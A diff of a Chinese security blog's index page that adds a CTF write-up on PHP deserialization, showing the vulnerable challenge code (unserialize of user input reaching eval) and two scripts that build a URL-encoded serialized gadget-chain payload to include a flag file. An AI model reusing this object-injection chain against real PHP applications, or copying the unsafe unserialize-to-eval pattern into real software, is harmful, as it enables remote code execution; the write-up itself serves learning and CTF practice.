@@ -164,6 +164,101 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-php反序化（重复利用同一个类）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/28/php%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%E5%90%8C%E4%B8%80%E4%B8%AA%E7%B1%BB%EF%BC%89/">php反序化（重复利用同一个类）</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/03/28/php%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%E5%90%8C%E4%B8%80%E4%B8%AA%E7%B1%BB%EF%BC%89/" class="archive-article-date">
+  	<time datetime="2022-03-27T16:22:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>题目：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;waf.php&quot;;</span><br><span class="line">class NISA&#123;</span><br><span class="line">    public $fun&#x3D;&quot;show_me_flag&quot;;</span><br><span class="line">    public $txw4ever;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;fun&#x3D;&#x3D;&quot;show_me_flag&quot;)&#123;</span><br><span class="line">            hint();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __call($from,$val)&#123;</span><br><span class="line">        $this-&gt;fun&#x3D;$val[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;fun;</span><br><span class="line">        return &quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        checkcheck($this-&gt;txw4ever);</span><br><span class="line">        @eval($this-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TianXiWei&#123;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $x;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;ext-&gt;nisa($this-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">    public $huang;</span><br><span class="line">    public $su;</span><br><span class="line"></span><br><span class="line">    public function __call($fun1,$arg)&#123;</span><br><span class="line">        $this-&gt;huang-&gt;fun&#x3D;$arg[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $bb &#x3D; $this-&gt;su;</span><br><span class="line">        return $bb();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class four&#123;</span><br><span class="line">    public $a&#x3D;&quot;TXW4EVER&quot;;</span><br><span class="line">    private $fun&#x3D;&#39;abc&#39;;</span><br><span class="line"></span><br><span class="line">    public function __set($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$name&#x3D;$value;</span><br><span class="line">        if ($this-&gt;fun &#x3D; &quot;sixsixsix&quot;)&#123;</span><br><span class="line">            strtolower($this-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;ser&#39;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#39;ser&#39;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;func checkcheck($data)&#123;</span><br><span class="line">&#x2F;&#x2F;  if(preg_match(......))&#123;</span><br><span class="line">&#x2F;&#x2F;      die(something wrong);</span><br><span class="line">&#x2F;&#x2F;  &#125;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;function hint()&#123;</span><br><span class="line">&#x2F;&#x2F;    echo &quot;.......&quot;;</span><br><span class="line">&#x2F;&#x2F;    die();</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>利用链：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class TianXiWei:__wakeup&#123;$this-&gt;ext-&gt;nisa($this-&gt;x);--&gt;class Ilovetxw:__call($fun1,$arg)&#123;$this-&gt;huang-&gt;fun&#x3D;$arg[0];--&gt;class four:__set($name, $value)&#123;strtolower($this-&gt;a);--&gt;class Ilovetxw:__toString()&#123;return $bb();--&gt;class NISA:__invoke()&#123;eval($this-&gt;txw4ever);&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>因为要用两个Ilovetxw类，为了防止出现无线循环，可以分两个文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class four&#123;</span><br><span class="line">	public $a;</span><br><span class="line">    private $fun;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">            $this -&gt; a &#x3D; new Ilovetxw();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">	public $huang;</span><br><span class="line">    public $su;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">            $this -&gt; su &#x3D; new NISA();</span><br><span class="line">        &#125;        </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class NISA&#123;</span><br><span class="line">	public $fun;</span><br><span class="line">    public $txw4ever;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">            $this -&gt; txw4ever &#x3D; &quot;include(&#39;&#x2F;fllllllaaag&#39;);&quot;;</span><br><span class="line">        &#125;        </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ser&#x3D;new four();</span><br><span class="line">echo urlencode(serialize($ser));</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TianXiWei&#123;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $x;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">            $this -&gt; ext &#x3D; new Ilovetxw();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">	public $huang;</span><br><span class="line">    public $su;</span><br><span class="line">        public function __construct() &#123;</span><br><span class="line">            $this -&gt; huang &#x3D; unserialize(urldecode(&quot;O%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BN%3Bs%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3BN%3Bs%3A8%3A%22txw4ever%22%3Bs%3A24%3A%22include%28%27%2Ffllllllaaag%27%29%3B%22%3B%7D%7Ds%3A9%3A%22%00four%00fun%22%3BN%3B%7D&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ser&#x3D;new TianXiWei();</span><br><span class="line">echo urlencode(serialize($ser));</span><br></pre></td></tr></table></figure>
+<p>或者不用<code>__construct</code>赋值，而用<code>__invoke</code>带参,然后new两次，让两次new的内容不一样</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/03/28/php%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%E5%90%8C%E4%B8%80%E4%B8%AA%E7%B1%BB%EF%BC%89/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-java反序化（CommonsBeanutils）笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1865,95 +1960,6 @@ log4j.rootLogger=DEBUG,console,file
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2022/01/19/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-JavaScript笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/18/JavaScript%E7%AC%94%E8%AE%B0/">JavaScript笔记</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2022/01/18/JavaScript%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2022-01-18T08:43:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>“js开发只用了十天”</p>
-<p>以后有时间补</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/18/JavaScript%E7%AC%94%E8%AE%B0/">展开全文 >></a>
         </p>
       
 
